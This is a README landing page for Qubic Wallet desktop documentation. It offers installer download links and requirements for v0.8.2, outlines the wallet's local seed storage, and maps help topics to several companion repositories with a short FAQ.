![Qubic Wallet](assets/qubic-wallet-download-seed-phrase-install-address-profile-banner.png)

# Qubic Wallet

Documentation for the Qubic desktop wallet, split by task.

<p align="center"><a href="https://github.com/qubic-wallet/qubic-wallet-trust/blob/main/LICENSE"><img src="assets/badge-license.svg" alt="License"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2"><img src="assets/badge-release.svg" alt="Release"></a></p>

## Downloads - v0.8.2

<p align="center"><a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`qubic-wallet-desktop-v0.8.2-windows.exe`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`qubic-wallet-desktop-v0.8.2-osx-arm64.zip`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`qubic-wallet-desktop-v0.8.2-linux-x64.zip`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip) |

> Documentation for the Qubic desktop wallet, organised by the task in front of you rather than by feature
> list. Five repositories, one per kind of question.

## What Qubic Wallet does

Qubic Wallet is the desktop wallet for Qubic. It creates and stores accounts locally from a seed, holds
the Qubic assets the build supports, and includes the QX trading screen. There is no server-side account
holding your keys, which is the property the rest of this documentation keeps returning to: nobody can
restore the account for you, and nobody can freeze it either.

The wallet runs on Windows, macOS and Linux. Builds are published on the release page of the desktop
wallet repository, with the installer names and archive formats that the guides refer to. The documentation
assumes the desktop build unless a page says otherwise, because the desktop build is the one that keeps
keys on your machine.

The guides are written against the current release and state which version they describe, and each page
opens with the question it answers so you can tell in one line whether it is the page you need. Where a
guide links to another repository, the link goes to the guide itself rather than to a landing page. They are also
written to be read on the machine you are setting up, so every install, restore and diagnostic page names
the file, the folder or the screen you should be looking at at that moment. Where a feature
is not in the build, the page says so rather than describing a workflow you cannot follow. Where a claim
cannot be checked from the release, the repository or the client constants, the page says that too.

## How this documentation is organised

The guides are split by the question someone is asking, not by the part of the product the answer touches.
Installation and account questions live together because a seed problem during setup is not a
troubleshooting problem yet; failures after setup live together because the order of diagnosis matters more
than the symptom. Feature questions are separate from trust questions on purpose: whether something exists
and whether it should be trusted are different inquiries with different evidence.

Each repository opens with a page that explains the cluster and then lists every guide in it with one
sentence about what that guide settles. If you only read the landing page of the repository you need, you
should be able to tell whether the answer is in there. Every guide states the version it describes, and
where a claim cannot be checked from the release, the repository or the client constants, the page says so
instead of asserting it.

Nothing in this documentation is an audit or an endorsement, and no page asks for a seed phrase. A guide
that requests one is describing an attack rather than a fix, which is the single most useful thing to
remember when a search result looks more helpful than these pages do.

## Guides by need

| Need | Repository | Start with |
| --- | --- | --- |
| Install it and create an account | [Setup and accounts](https://github.com/qubic-wallet/qubic-wallet-setup) | [Download and verify the installer](https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-download-verify-installer.md) |
| Fix something that stopped working | [Troubleshooting](https://github.com/qubic-wallet/qubic-wallet-troubleshooting) | [Not syncing](https://github.com/qubic-wallet/qubic-wallet-troubleshooting/blob/main/qubic-wallet-not-syncing.md) |
| Find out whether a feature exists | [Features and platform support](https://github.com/qubic-wallet/qubic-wallet-features) | [Asset list](https://github.com/qubic-wallet/qubic-wallet-features/blob/main/qubic-wallet-token-assets-list.md) |
| Check the wallet before trusting it | [Trust and comparisons](https://github.com/qubic-wallet/qubic-wallet-trust) | [Is Qubic Wallet safe](https://github.com/qubic-wallet/qubic-wallet-trust/blob/main/is-qubic-wallet-safe.md) |
| Read or rebuild the wallet itself | [qubic-desktop-wallet](https://github.com/qubic-wallet/qubic-desktop-wallet) | The release page |

## Popular questions

### Where do I download Qubic Wallet?

From the release page of the desktop wallet repository, which is the only location the documentation
points at. The download guide explains how to match the file you received to the published artefact.

### Is my seed stored anywhere else?

No. Accounts are created locally from the seed and the vault on your machine is encrypted with your
password. That is also why a lost seed cannot be recovered by anyone, including the publisher.

### Which repository should I read first?

The setup repository if you are installing, the trust repository if you are deciding whether to. The
troubleshooting pages assume you already have a working build and one specific problem.

### Why do some pages read like status reports?

Because several capabilities are not in the current build, and a tutorial for a missing screen is worse
than a short page that says it is missing. The status pages are written to be read once and checked against
the release, not re-read as a promise.

### Does the documentation cover the web wallet?

Only where the comparison matters, in the trust repository. Everything else describes the desktop build,
because that is the one whose keys stay on your machine.

## Repositories

- [qubic-wallet-setup](https://github.com/qubic-wallet/qubic-wallet-setup) - install, create, back up and
  restore an account, with the recovery path tested on purpose rather than assumed.
- [qubic-wallet-troubleshooting](https://github.com/qubic-wallet/qubic-wallet-troubleshooting) - sync,
  balance, transaction, fee and launch problems, in the order that resolves them fastest.
- [qubic-wallet-features](https://github.com/qubic-wallet/qubic-wallet-features) - the asset model, QX
  trading and status pages for the features the current build does not include.
- [qubic-wallet-trust](https://github.com/qubic-wallet/qubic-wallet-trust) - source, release, seed model,
  incident history and comparisons, written as checks rather than assurances.
- [qubic-desktop-wallet](https://github.com/qubic-wallet/qubic-desktop-wallet) - the wallet itself: source,
  build configuration and the release page that every guide links back to.
- [qubic-cli](https://github.com/qubic-wallet/qubic-cli) - a reserved repository for command-line tooling,
  currently without published content, so nothing here links to instructions that do not exist yet.
- [qubic-connect](https://github.com/qubic-wallet/qubic-connect) - the demo for the Qubic Connect UI package,
  for developers building an interface against the network.
- [qubic-stats-service](https://github.com/qubic-wallet/qubic-stats-service) - an HTTP service over Qubic node
  statistics, used when you want numbers outside the wallet.
- [core-network](https://github.com/qubic-wallet/core-network) - the node software the network runs on, for
  readers who want the protocol side rather than the wallet side.
